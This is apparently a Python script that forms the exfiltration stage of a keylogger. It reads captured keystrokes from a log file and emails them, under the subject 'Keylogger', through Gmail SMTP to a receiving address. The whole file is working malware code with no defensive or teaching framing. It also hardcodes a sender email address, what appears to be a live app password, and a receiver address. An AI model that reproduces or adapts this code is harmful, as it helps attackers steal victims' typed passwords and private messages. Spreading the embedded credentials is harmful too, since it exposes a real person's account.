import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

file_data = ""

#Open file
with open('test.log', 'r') as f:
  #Loop through each line of the file
  for line in (line.strip('\n') for line in f):
    file_data += line

content = "Here are the latest recordings from keylogger.\n" + file_data

#The mail addresses and password
sender_email = 'yeah4sureee@gmail.com'
sender_pass = 'fxwkfrtpnbvtozhm'
receiver_email = 'slabysh2015@gmail.com'
#Setup the MIME
message = MIMEMultipart()
message['From'] = sender_email
message['To'] = receiver_email
message['Subject'] = 'Keylogger'   #The subject line
#The body and the attachments for the mail
message.attach(MIMEText(content, 'plain'))
#Create SMTP session for sending the mail
server = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
server.starttls() #enable security
server.login(sender_email, sender_pass) #login with mail_id and password
text = message.as_string()
server.sendmail(sender_email, receiver_email, text)
server.quit()
print('Mail Sent')